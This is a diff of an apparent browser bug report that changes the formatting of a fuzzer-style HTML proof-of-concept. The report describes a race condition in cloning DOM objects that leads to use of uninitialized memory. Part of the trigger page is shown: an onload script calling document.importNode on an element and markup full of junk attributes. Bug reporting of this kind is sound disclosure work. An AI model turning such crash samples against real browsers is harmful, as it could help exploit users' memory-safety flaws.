@@ -65,7 +65,7 @@ who do not zero out non-existing fields, calling a clone on this object will lea
 
 i have also found different code paths to the same issue that i have identified as a race condition leading to use-of-uninitialized memory (maybe this sample will help):<br>
 
-```javascript
+```html
 <script>
 function trigger() {
 
@@ -86,7 +86,7 @@ var heapOverFlow = document.importNode(uafObject,true);
 </script>
 <body onload=trigger()>
 <title id="junk" style=" content: var(--cssvard); grid-gap: none; border-left-color: ; orientation: auto" class="class7" loop="1" crossorigin="crossorigin" formmethod="post" cols="0" controls="controls"></title>
-<canvas id="canvas" name="[g1Wvvph^&amp;1S7I" hidden="hidden" dir="ltr" name="" width="0" low="1" placeholder="" onhashchange="" ontransitionend="" frame="BOX">
+<canvas id="canvas" name="" hidden="hidden" dir="ltr" name="" width="0" low="1" placeholder="" onhashchange="" ontransitionend="" frame="BOX">
 <font id="uafObject" title="" size="4" tabindex="4" dir="auto" title="W" usemap="" disposition="attachment" pluginspage="" preload="none" accept="image/*"></font>
 </canvas>
 </body>
